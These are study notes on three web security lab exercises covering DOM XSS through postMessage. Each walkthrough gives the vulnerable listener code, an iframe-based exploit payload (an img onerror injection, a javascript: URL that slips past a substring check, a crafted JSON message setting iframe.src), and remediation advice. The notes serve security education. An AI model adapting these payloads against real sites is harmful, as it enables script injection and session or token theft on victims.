# 🧠Lab-1 DOM-Based Web Message Vulnerabilities

---

## 📖 Overview

```txt
A DOM-based web message vulnerability happens when:

Attacker-controlled web message
        ↓
received by page
        ↓
passed into dangerous sink
        ↓
JavaScript executes
```

This is basically:

```txt
postMessage() + unsafe JavaScript handling
```

---

# 🌐 What Is a Web Message?

Modern browsers allow:

```txt
tabs
iframes
popups
windows
```

to communicate with each other using:

```javascript
postMessage()
```

---

# 🧩 Why Browsers Need This

Websites often embed:

```txt
payment popups
login popups
ads
widgets
iframes
external apps
```

Example:

```txt
Main website
    ↓
opens payment popup
    ↓
popup sends:
"payment successful"
```

without reloading page.

---

# 🏦 Real-Life Example

Imagine:

```txt
bank.com
```

opens:

```txt
payment-provider.com
```

popup.

After payment:

```javascript
window.opener.postMessage("paid", "*")
```

Main page receives:

```txt
"paid"
```

and updates UI.

---

# 🛡️ Same-Origin Policy (SOP)

Normally:

```txt
One website cannot directly access another website's data.
```

Example:

```txt
evil.com
```

cannot read:

```txt
gmail.com
```

DOM.

This protection is called:

```txt
Same-Origin Policy
```

---

# ⚠️ But postMessage() Is Special

Browser intentionally allows communication through:

```javascript
postMessage()
```

because websites need it.

But:

```txt
developer must verify sender safely

otherwise attacker can send malicious data
```

---

# 🔄 Basic Web Message Flow

```txt
Page A
   ↓ postMessage()
Page B
   ↓ receives event
event.data contains message
```

---

# 📦 Message Event Object

When page receives message:

```javascript
window.addEventListener("message", function(e){
```

Browser creates:

```txt
e
```

called:

```txt
Event Object
```

---

# 🔑 Important Properties

## 📨 e.data

Actual message.

Example:

```txt
"hello"
```

or:

```html
"<img onerror=alert(1)>"
```

---

## 🌍 e.origin

Who sent message.

Example:

```txt
https://trusted-site.com
```

---

# 🎯 Source and Sink

---

## 📥 Source

Attacker-controlled input.

Common source here:

```javascript
e.data
```

because attacker controls message.

---

## 💣 Sink

Dangerous function.

Examples:

```javascript
innerHTML
eval()
document.write()
location=
```

---

# 🚨 Vulnerability Condition

```txt
Attacker controls source
        ↓
website passes into sink unsafely
        ↓
DOM vulnerability
```

---

# ❌ Vulnerable Example

```javascript
window.addEventListener('message', function(e) {
    document.getElementById('ads').innerHTML = e.data;
});
```

---

# ⚠️ Why Vulnerable?

Because:

```javascript
innerHTML
```

parses HTML.

If attacker sends:

```html
<img src=1 onerror=alert(1)>
```

browser executes JS.

---

# 🧪 Lab Walkthrough — Official Lab

---

## 🎯 Goal

Trigger:

```javascript
print()
```

using web messages.

---

# 🚀 Step 1 — Open Lab

Open lab homepage.

---

# 🔍 Step 2 — Inspect Source

View source or inspect scripts.

You find:

```javascript
window.addEventListener('message', function(e) {
    document.getElementById('ads').innerHTML = e.data;
})
```

---

# 📸 Screenshot — Vulnerable Source Code

```txt
File: DOM-Based-Web-Message-Vuln-Source.png
```

![Vulnerable Source Code](../images/dom-based-web-message-source.png)

---

# 🧠 Step 3 — Analyze Vulnerability

## 📥 Source

```javascript
e.data
```

User-controlled web message.

---

## 💣 Sink

```javascript
innerHTML
```

Dangerous HTML sink.

---

# 🌐 Step 4 — Go To Exploit Server

Click:

```txt
Go to exploit server
```

---

# 💥 Step 5 — Paste Payload

Inside BODY:

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/"
onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
</iframe>
```

Replace:

```txt
YOUR-LAB-ID
```

with lab URL.

---

# 🔬 Payload Breakdown

---

## 🪟 Part 1 — iframe

```html
<iframe src="https://lab-id.net">
```

Loads vulnerable website.

---

## ⚡ Part 2 — onload

```javascript
onload=""
```

Runs JS after iframe fully loads.

---

## 🧭 Part 3 — contentWindow

```javascript
this.contentWindow
```

Access iframe's browser window.

---

## 📨 Part 4 — postMessage()

```javascript
postMessage(payload, "*")
```

Sends message into iframe page.

---

## ☠️ Part 5 — Payload

```html
<img src=1 onerror=print()>
```

This becomes:

```javascript
e.data
```

inside vulnerable page.

---

## 💣 Part 6 — innerHTML

Vulnerable page does:

```javascript
innerHTML = e.data
```

Browser creates:

```html
<img src=1 onerror=print()>
```

inside DOM.

---

## 🚨 Part 7 — Trigger Execution

```javascript
src=1
```

invalid image.

Image loading fails.

Browser triggers:

```javascript
onerror
```

which executes:

```javascript
print()
```

---

## 🌍 Part 8 — *

```txt
"*"
```

means:

```txt
allow all origins
```

No restriction.

---

# 💾 Step 6 — Store Exploit

Click:

```txt
Store
```

---

# 📤 Step 7 — Deliver Exploit

Click:

```txt
Deliver exploit to victim
```

Lab solved.

---

# 🔄 Complete Attack Flow

```txt
Victim opens exploit page
        ↓
Exploit page loads iframe
        ↓
iframe loads vulnerable website
        ↓
onload executes
        ↓
postMessage sends malicious HTML
        ↓
website receives message
        ↓
message stored in e.data
        ↓
innerHTML inserts payload into DOM
        ↓
browser parses malicious HTML
        ↓
onerror executes
        ↓
print() executes
```

---

# 🧠 Mental Model

```txt
Attacker sends malicious message →
website trusts message →
website injects message into HTML →
browser executes JavaScript
```

---

# 📚 Important Concepts

## 📨 postMessage()

Cross-window communication API.

---

## 📩 addEventListener("message")

Receives web messages.

---

## 📦 e.data

Actual message contents.

---

## 🌍 e.origin

Sender origin.

Example:

```txt
https://trusted-site.com
```

---

# ☠️ Common Dangerous Sinks

```javascript
innerHTML
outerHTML
eval()
document.write()
location=
setTimeout()
setInterval()
```

---

# 📥 Common Sources

```javascript
e.data
location.search
location.hash
document.cookie
document.referrer
localStorage
sessionStorage
```

---

# ❗ Why This Happens

Developers trust:

```javascript
e.data
```

without validation.

---

# ✅ Safe Code

```javascript
window.addEventListener("message", function(e){

   if(e.origin !== "https://trusted-site.com"){
      return;
   }

   document.getElementById("ads").innerText = e.data;

});
```

---

# 🛡️ Why innerText Is Safer

```javascript
innerText
```

shows text only.

Does NOT parse HTML.

---

# ❌ Dangerous Version

```javascript
innerHTML
```

parses HTML and executes events.

---

# 🌍 Real-World Impact

Can lead to:

```txt
DOM XSS
session theft
account takeover
phishing
admin compromise
token theft
malware delivery
```

---

# 🎯 High-Value Real Targets

Often found in:

```txt
ad systems
payment popups
OAuth login windows
embedded widgets
customer support chats
analytics dashboards
cross-domain iframes
```

---

# 🚩 Red Flags During Testing

Look for:

```javascript
addEventListener("message")
```

Then check:

```txt
Is origin verified?
Is e.data sanitized?
Is dangerous sink used?
```

---

# 🛠️ Browser DevTools Tip

You can search all JS for:

```javascript
postMessage
```

or:

```javascript
addEventListener("message")
```

inside:

```txt
Sources tab
```

---

# 🔐 Remediation

## 1️⃣ Verify Origin

```javascript
if(e.origin !== "https://trusted-site.com")
   return;
```

---

## 2️⃣ Avoid Dangerous Sinks

Avoid:

```javascript
innerHTML
eval()
document.write()
```

---

## 3️⃣ Sanitize Data

Use safe sanitization libraries.

---

## 4️⃣ Use innerText

Instead of:

```javascript
innerHTML
```

---

# 🏁 Final One-Line Summary

```txt
DOM-based web message vulnerabilities happen when attacker-controlled messages are received through postMessage() and inserted into dangerous JavaScript or HTML sinks without proper validation.
```

---

# 📌Lab-2 DOM XSS using Web Messages + JavaScript URL (Lab Notes)

---

## 🧭 Overview

This lab shows a DOM-based vulnerability where:

- A page listens for messages using `postMessage()`
- It trusts the incoming message too much
- It directly assigns that message into `location.href`

Core issue:
Unsafe web message → unsafe URL redirection → JavaScript execution

---

## 🧠 What is this Topic

This is a DOM-based web message vulnerability.

Key idea:

One page sends a message → another page receives it  
Receiver does NOT properly validate it  
Message is used in a dangerous sink (`location.href`)

Important components:

Source:
```javascript
postMessage()
```

Sink:
```javascript
location.href
```

If URL starts with:
```text
javascript:
```
browser executes code instead of navigating

---

## 🧪 Lab Walkthrough (Step-by-step)

### 🔐 Step 1: Login

```text
wiener:peter
```

---

### 🧾 Step 2: Identify Vulnerable Code (Source Page SS)

🖼️ SS - Source Page (View Source / DevTools)

![ss1](../images/source-page-js-url-code.png)


Vulnerable JavaScript:

```javascript
window.addEventListener('message', function(e) {

    if (
        e.data.indexOf('http:') > -1 ||
        e.data.indexOf('https:') > -1
    ) {
        location.href = e.data;
    }

});
```

---

## ⚠️ Step 3: Weakness

- Only checks substring `http:`
- No full URL validation
- Direct assignment to sink

```javascript
location.href = e.data
```

---

## 🚀 Step 4: Exploit Payload

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/"
onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
</iframe>
```

---

## 🔄 Step 5: Execution Flow

```text
iframe loads page
↓
postMessage sent
↓
message received
↓
validation passes
↓
location.href set
↓
javascript executed
↓
print() runs
```

---

## 🏁 Step 6: Lab Solved

```text
javascript:print() executed in victim context
```

---

## 🌍 Real-World Impact

- ad systems
- payment popups
- iframe widgets
- chat systems

Attackers can:
- XSS execution
- redirects
- script execution

---

## 🎯 High Value Targets

```
/
 /dashboard
 /my-account
 /payment
 /profile
 iframe components
```

---

## 🔗 Attack Chain

```text
iframe → postMessage → listener → weak validation → location.href → javascript: → XSS
```

---

## 🛡️ Remediation

- validate `event.origin`
- allow only trusted domains
- avoid:
```javascript
location.href = userInput
```
- use:
```javascript
startsWith("https://trusted-site.com")
```
- apply CSP

---

## 🧠 FINAL ONE-LINE MEMORY

Unsafe postMessage input is directly assigned to `location.href` without validation, allowing `javascript:` execution and DOM XSS.

---

# 📌Lab-3 DOM XSS using Web Messages + JSON Parsing + iframe.src

---

## 🧭 Overview

This lab demonstrates a DOM-based XSS vulnerability using:

- Web Messages
- JSON parsing
- iframe source manipulation

The vulnerable page:

- listens for incoming `postMessage()` messages
- parses messages using `JSON.parse()`
- checks type using `switch`
- loads attacker-controlled data into `iframe.src`

Because the application:

- does not verify sender origin
- trusts attacker-controlled JSON
- directly uses user-controlled URLs in dangerous sinks

an attacker can execute JavaScript in the victim’s browser.

---

## 🧠 What Is The Topic?

This topic combines several DOM concepts together:

| Concept | Meaning |
|---|---|
| Web Messages | Browser communication between windows/iframes |
| postMessage() | API used to send data between pages |
| JSON.parse() | Converts string → JavaScript object |
| switch statement | Executes functionality based on message type |
| Sink | Dangerous function/property |
| iframe.src | Loads URL/code into iframe |
| javascript: URL | Executes JavaScript instead of webpage |

---

## ⚠️ Core Concept

Application expects messages like:

```json
{
  "type":"load-channel",
  "url":"https://safe-site.com/video"
}
```

Developer intention:

- trusted page sends message
- website loads safe content into iframe

Attacker sends:

```json
{
  "type":"load-channel",
  "url":"javascript:print()"
}
```

Now application loads JavaScript instead of safe content.

---

## 🧩 Important DOM Concepts

### 📥 Source

Attacker-controlled source:

```javascript
e.data
```

because it comes from:

```javascript
postMessage()
```

---

### 🔄 Parsing

Application converts string → object using:

```javascript
JSON.parse(e.data)
```

---

### 🧠 switch()

Application checks:

```javascript
switch(data.type)
```

Example:

| type value | functionality |
|---|---|
| play-video | play video |
| pause-video | pause |
| load-channel | load iframe URL |

---

### ☠️ Sink

Dangerous sink:

```javascript
ACMEplayer.element.src = data.url;
```

Attacker controls:

```javascript
data.url
```

Therefore attacker controls iframe source.

---

## 🧪 Vulnerable Code Breakdown

### 🖼️ SS - View Source (Vulnerable JSON Parsing Code)

![ss1](view-source-json-code.png)

Example vulnerable code:

```javascript
window.addEventListener('message', function(e) {

    var data = JSON.parse(e.data);

    switch(data.type) {

        case "load-channel":
            ACMEplayer.element.src = data.url;
            break;
    }

});
```

---

## 🔍 Code Flow Breakdown

### 🧭 Step 1 — Event Listener Waits

```javascript
window.addEventListener('message', ...)
```

Meaning:

```text
Wait for incoming postMessage() data
```

---

### 📩 Step 2 — Message Arrives

Attacker sends:

```javascript
postMessage(...)
```

Browser stores it in:

```javascript
e.data
```

---

### 🔄 Step 3 — JSON Parsing

Application converts:

FROM:

```json
"{\"type\":\"load-channel\"}"
```

TO:

```json
{
  "type":"load-channel"
}
```

---

### 🔀 Step 4 — switch Checks Type

```javascript
switch(data.type)
```

If type equals:

```text
load-channel
```

matching functionality executes.

---

### ☠️ Step 5 — Dangerous Action

```javascript
ACMEplayer.element.src = data.url;
```

Attacker controls:

```javascript
data.url
```

Therefore attacker controls iframe source.

---

## 🧪 Lab Walkthrough (Full Detailed Steps)

### 🌐 Step 1 — Open Lab

Visit lab homepage.

Notice JavaScript contains:

- `addEventListener('message')`
- `JSON.parse()`
- `switch()`
- `iframe.src`

This indicates:

- web message handling
- attacker-controlled sink

---

### 🧠 Step 2 — Understand Expected JSON Structure

Application expects:

```json
{
  "type":"load-channel",
  "url":"SOME_URL"
}
```

---

### 🚀 Step 3 — Go To Exploit Server

Open exploit server.

Create attacker-controlled page.

---

### 💣 Step 4 — Build Exploit iframe

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/"
onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

---

## 🔍 Payload Breakdown

### 🖼️ iframe

```html
<iframe src="victim-site">
```

Loads victim site inside attacker page.

---

### ⚙️ onload

```javascript
onload='...'
```

Runs JavaScript after iframe fully loads.

---

### 🪟 this.contentWindow

Refers to:

```text
actual page/window inside iframe
```

---

### 📨 postMessage()

```javascript
postMessage(message, targetOrigin)
```

Sends data to another page.

---

### 🧾 JSON String

```json
{
  "type":"load-channel",
  "url":"javascript:print()"
}
```

---

### ❓ Why "load-channel"?

Because switch checks:

```javascript
switch(data.type)
```

We must match valid functionality.

---

### ⚠️ Why javascript:print()?

Because:

```text
javascript:
```

tells browser:

```text
execute JavaScript code
```

instead of loading webpage.

---

### 🌍 Why "*" ?

```text
"*"
```

means:

```text
send message regardless of origin
```

---

## 🔄 Browser Execution Flow

### 🧭 Step 1

```text
Attacker page loads victim iframe
```

---

### 🧭 Step 2

```text
Iframe finishes loading
```

---

### 🧭 Step 3

```text
onload executes
```

---

### 🧭 Step 4

```text
postMessage sends malicious JSON
```

---

### 🧭 Step 5

```text
Victim receives message
```

---

### 🧭 Step 6

Application runs:

```javascript
JSON.parse(e.data)
```

---

### 🧭 Step 7

switch matches:

```text
load-channel
```

---

### 🧭 Step 8

Application runs:

```javascript
iframe.src = "javascript:print()"
```

---

### 🧭 Step 9

Browser executes:

```javascript
print()
```

---

## 🚨 Why This Vulnerability Exists

Because application:

- trusts incoming messages
- has no origin verification
- trusts attacker-controlled JSON
- uses attacker-controlled URL in dangerous sink

---

## 🌍 Real-World Scenarios

### 🎥 Embedded Video Players

Loading videos/channels dynamically.

---

### 📢 Advertisement Widgets

Receiving instructions from parent windows.

---

### 💳 Payment Popups

Cross-window communication between payment providers and websites.

---

### 🔐 OAuth/Login Popups

Authentication windows communicating tokens.

---

## 🎯 High-Value Endpoints

Look for:

- iframe communication
- embedded widgets
- video players
- chat systems
- ad systems
- payment systems
- OAuth popups

Search JavaScript for:

```javascript
postMessage
message
JSON.parse
window.addEventListener
iframe.src
location.href
```

---

## 🔗 Multi-Chain Attack Possibilities

| Vulnerability | Result |
|---|---|
| DOM XSS | Full JS execution |
| Open Redirect | Redirect users |
| CSRF | Forced actions |
| Token Theft | Steal JWT/session |
| Clickjacking | UI manipulation |
| OAuth flaws | Account takeover |

---

## 🛡️ Remediation

Verify origin strictly.

BAD:

```javascript
if(origin.indexOf("trusted.com") > -1)
```

GOOD:

```javascript
if(origin === "https://trusted.com")
```

---

Never trust `postMessage` data.

Validate:

- structure
- type
- allowed values

---

Block:

```text
javascript:
```

Allow only:

- `https:`
- safe domains

---

Avoid dangerous sinks:

```javascript
iframe.src
innerHTML
eval()
location.href
```

with attacker-controlled data.

---

## 🧠 Mental Model

```text
Attacker page
    ↓
postMessage(JSON)
    ↓
Victim receives message
    ↓
JSON.parse()
    ↓
switch(type)
    ↓
iframe.src = attacker URL
    ↓
javascript: executes
```

---

## 🧠 Final One-Line Understanding

Attacker sends crafted JSON through `postMessage`, the victim page blindly parses and trusts it, then loads attacker-controlled JavaScript into `iframe.src`, resulting in DOM XSS.
